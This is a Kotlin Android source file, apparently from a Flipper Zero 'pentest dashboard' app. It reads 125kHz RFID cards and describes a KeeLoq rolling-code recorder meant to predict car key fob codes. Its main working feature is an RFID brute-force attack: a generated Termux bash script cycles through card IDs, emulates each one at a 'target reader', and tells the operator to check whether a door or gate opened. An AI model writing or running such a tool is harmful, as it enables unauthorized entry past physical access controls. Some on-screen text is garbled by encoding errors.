package com.pentest.dashboard

import android.os.Bundle
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton

class RFIDActivity : AppCompatActivity() {

    private lateinit var cardStatus: TextView
    private lateinit var cardId: TextView
    private lateinit var cardInfo: TextView
    private lateinit var btnSaveCard: MaterialButton
    private lateinit var btnEmulateCard: MaterialButton
    private lateinit var btnStopProcess: MaterialButton

    private var hasCard = false
    private var lastCardData: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_rfid)

        // Stop any running processes from other activities
        ProcessManager.stopCurrentProcess(this)

        cardStatus = findViewById(R.id.cardStatus)
        cardId = findViewById(R.id.cardId)
        cardInfo = findViewById(R.id.cardInfo)
        btnSaveCard = findViewById(R.id.btnSaveCard)
        btnEmulateCard = findViewById(R.id.btnEmulateCard)
        btnStopProcess = findViewById(R.id.btnStopProcess)

        btnStopProcess.setOnClickListener {
            stopAllProcesses()
        }

        // Set up callback to receive REAL data from Flipper
        FlipperConnectionManager.setDataReceivedCallback { data ->
            runOnUiThread {
                parseFlipperResponse(data)
            }
        }

        findViewById<ImageView>(R.id.btnBack).setOnClickListener {
            stopAllProcesses()
            finish()
        }

        findViewById<MaterialButton>(R.id.btnReadCard).setOnClickListener {
            readCard()
        }

        btnSaveCard.setOnClickListener {
            Toast.makeText(this, "Card saved to archive", Toast.LENGTH_SHORT).show()
        }

        btnEmulateCard.setOnClickListener {
            Toast.makeText(this, "Emulating card...", Toast.LENGTH_SHORT).show()
        }

        findViewById<MaterialButton>(R.id.btnRollingCode).setOnClickListener {
            startRollingCodeRecorder()
        }

        findViewById<MaterialButton>(R.id.btnBruteFob).setOnClickListener {
            startBruteFob()
        }

        findViewById<MaterialButton>(R.id.btnSavedCards).setOnClickListener {
            Toast.makeText(this, "Saved Cards - Coming soon", Toast.LENGTH_SHORT).show()
        }
    }

    private fun readCard() {
        cardStatus.text = "READING RFID..."
        cardInfo.text = ""
        addLog("=== RFID READ STARTED ===")

        if (!FlipperConnectionManager.isConnected()) {
            addLog("ERROR: Flipper Zero not connected!")
            addLog("Connect via USB or Bluetooth first")
            cardStatus.text = "NOT CONNECTED"
            Toast.makeText(this, "Connect Flipper Zero first", Toast.LENGTH_SHORT).show()
            return
        }

        addLog("Connected to Flipper via ${if (FlipperConnectionManager.connectionType == "usb") "USB-C" else "Bluetooth"}")
        addLog("")
        addLog("Opening RFID app on Flipper...")
        FlipperConnectionManager.sendCommand("loader open RFID")

        cardInfo.postDelayed({
            addLog("Sending read command...")
            FlipperConnectionManager.sendCommand("rfid read")
            addLog("")
            addLog("üì° PLACE RFID CARD (125kHz) NEAR FLIPPER ANTENNA")
            addLog("")
            addLog("Waiting for card data from Flipper...")
            addLog("(This shows REAL hardware responses)")
        }, 1500)
    }

    private fun parseFlipperResponse(data: String) {
        addLog("üì© FLIPPER RESPONSE: $data")

        // Parse different response types
        when {
            data.contains("RFID_READ", ignoreCase = true) -> {
                // Extract card data from response
                val parts = data.split("|")
                if (parts.size > 1) {
                    val cardData = parts[1]
                    lastCardData = cardData
                    cardId.text = cardData
                    cardStatus.text = "CARD DETECTED"
                    hasCard = true
                    btnSaveCard.isEnabled = true
                    btnEmulateCard.isEnabled = true
                    addLog("")
                    addLog("‚úÖ CARD READ SUCCESSFUL!")
                    addLog("Card ID: $cardData")
                }
            }
            data.contains("OK", ignoreCase = true) -> {
                addLog("‚úì Command acknowledged by Flipper")
            }
            data.contains("ERROR", ignoreCase = true) -> {
                addLog("‚ùå Error from Flipper: $data")
                cardStatus.text = "ERROR"
            }
            else -> {
                // Show any other data from Flipper
                addLog("Data: $data")
            }
        }
    }

    private fun stopAllProcesses() {
        ProcessManager.stopCurrentProcess(this)
        cardStatus.text = "STOPPED"
        addLog("")
        addLog("=== PROCESSES STOPPED ===")
        Toast.makeText(this, "All processes stopped", Toast.LENGTH_SHORT).show()
    }

    private fun startRollingCodeRecorder() {
        cardStatus.text = "RECORDING..."
        cardInfo.text = """
            === ROLLING CODE RECORDER ===

            This feature requires:
            - Flipper Zero with Sub-GHz module
            - Real car key fob
            - Multiple key presses (3-5)

            The process:
            1. Flipper listens on 433MHz
            2. You press fob button
            3. Flipper captures code
            4. Repeat for multiple presses
            5. Algorithm analysis (KeeLoq/etc)
            6. Predict next codes

            This is REAL cryptanalysis.
            It will NOT show fake instant results.
            Analysis takes 30+ seconds per press.

            Requires actual Flipper Zero hardware.
        """.trimIndent()
    }

    private fun startBruteFob() {
        cardStatus.text = "BRUTE FORCING..."

        // Show parameter dialog
        val parameters = listOf(
            ParameterDialog.Parameter(
                "START_ID",
                "Start ID (hex)",
                "Starting card ID (e.g., 0000000000)",
                defaultValue = "0000000000",
                required = true
            ),
            ParameterDialog.Parameter(
                "END_ID",
                "End ID (hex)",
                "Ending card ID (e.g., FFFFFFFFFF)",
                defaultValue = "FFFFFFFFFF",
                required = true
            ),
            ParameterDialog.Parameter(
                "DELAY_MS",
                "Delay (ms)",
                "Milliseconds between each code",
                defaultValue = "100",
                required = true
            ),
            ParameterDialog.Parameter(
                "FREQUENCY",
                "Frequency",
                "RFID frequency (125000 for 125kHz)",
                defaultValue = "125000",
                required = true
            )
        )

        ParameterDialog(this).showDialog(
            title = "Configure RFID Brute Force",
            parameters = parameters
        ) { values ->
            executeBruteForce(values)
        }
    }

    private fun executeBruteForce(params: Map<String, String>) {
        val startId = params["START_ID"]?.toLongOrNull(16) ?: 0L
        val endId = params["END_ID"]?.toLongOrNull(16) ?: 0xFFFFFFFFFFL
        val delayMs = params["DELAY_MS"]?.toLongOrNull() ?: 100L
        val frequency = params["FREQUENCY"] ?: "125000"

        // Validate inputs
        if (startId > endId) {
            cardStatus.text = "ERROR"
            cardInfo.text = "Start ID must be ‚â§ end ID"
            Toast.makeText(this, "Invalid range", Toast.LENGTH_SHORT).show()
            return
        }

        val totalCodes = endId - startId + 1
        if (totalCodes > 1_000_000_000) {
            cardStatus.text = "ERROR"
            cardInfo.text = "Range too large (max 1 billion codes)\nEstimated time: ${calculateTime(totalCodes, delayMs)}"
            Toast.makeText(this, "Range too large", Toast.LENGTH_LONG).show()
            return
        }

        if (delayMs < 10 || delayMs > 60000) {
            cardStatus.text = "ERROR"
            cardInfo.text = "Delay must be 10-60000ms"
            Toast.makeText(this, "Invalid delay", Toast.LENGTH_SHORT).show()
            return
        }

        cardInfo.text = """
            === RFID BRUTE FORCE ATTACK ===

            Start ID: ${String.format("%010X", startId)}
            End ID: ${String.format("%010X", endId)}
            Total codes: ${endId - startId + 1}
            Delay: ${delayMs}ms per code
            Frequency: ${frequency} Hz

            Estimated time: ${calculateTime(endId - startId + 1, delayMs)}

            Sending commands to Flipper...
            Commands will appear in Termux.

            ‚ö†Ô∏è KEEP FLIPPER NEAR TARGET READER
            ‚ö†Ô∏è KEEP APP IN FOREGROUND
            ‚ö†Ô∏è KEEP SCREEN ON
        """.trimIndent()

        // Create brute force script
        val bruteScript = """
            #!/data/data/com.termux/files/usr/bin/bash

            echo "=== RFID BRUTE FORCE ATTACK ==="
            echo "Start: ${String.format("%010X", startId)}"
            echo "End: ${String.format("%010X", endId)}"
            echo "Delay: ${delayMs}ms"
            echo ""

            COUNT=0
            TOTAL=$((${endId} - ${startId} + 1))

            for ((ID=${startId}; ID<=${endId}; ID++)); do
                HEX_ID=$(printf "%010X" ${'$'}ID)

                # Send to Flipper via USB serial
                echo "rfid emulate ${'$'}HEX_ID" > /dev/ttyUSB0 2>/dev/null || echo "rfid emulate ${'$'}HEX_ID" > /dev/ttyACM0 2>/dev/null

                COUNT=${'$'}((COUNT + 1))

                # Progress every 100 codes
                if [ ${'$'}((COUNT % 100)) -eq 0 ]; then
                    PERCENT=${'$'}((COUNT * 100 / TOTAL))
                    echo "[${'$'}PERCENT%] Tried: ${'$'}COUNT / ${'$'}TOTAL codes (Current: ${'$'}HEX_ID)"
                fi

                # Delay between codes
                sleep 0.${delayMs}
            done

            echo ""
            echo "=== BRUTE FORCE COMPLETE ==="
            echo "Total codes tried: ${'$'}COUNT"
            echo "If door/gate opened, check Flipper display for successful code"
        """.trimIndent()

        // Execute via ProcessManager so it can be stopped
        val processId = ProcessManager.startProcess(this, bruteScript)
        val scriptFile = java.io.File(getExternalFilesDir(null), "scripts/script_$processId.sh")

        val termux = TermuxIntegration(this)
        termux.runCommand("bash ${scriptFile.absolutePath}", background = false)

        addLog("")
        addLog("‚ö†Ô∏è Process ID: $processId")
        addLog("Click STOP button to halt attack")
        Toast.makeText(this, "Brute force started - Use STOP button to halt", Toast.LENGTH_LONG).show()
    }

    private fun calculateTime(totalCodes: Long, delayMs: Long): String {
        val totalSeconds = (totalCodes * delayMs) / 1000
        val hours = totalSeconds / 3600
        val minutes = (totalSeconds % 3600) / 60
        return "${hours}h ${minutes}m"
    }

    private fun addLog(message: String) {
        val timestamp = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US)
            .format(java.util.Date())
        val currentText = cardInfo.text.toString()
        cardInfo.text = "[$timestamp] $message\n$currentText"
    }

    override fun onDestroy() {
        super.onDestroy()
        stopAllProcesses()
    }

    override fun onPause() {
        super.onPause()
        // Stop processes when leaving activity
        ProcessManager.stopCurrentProcess(this)
    }
}
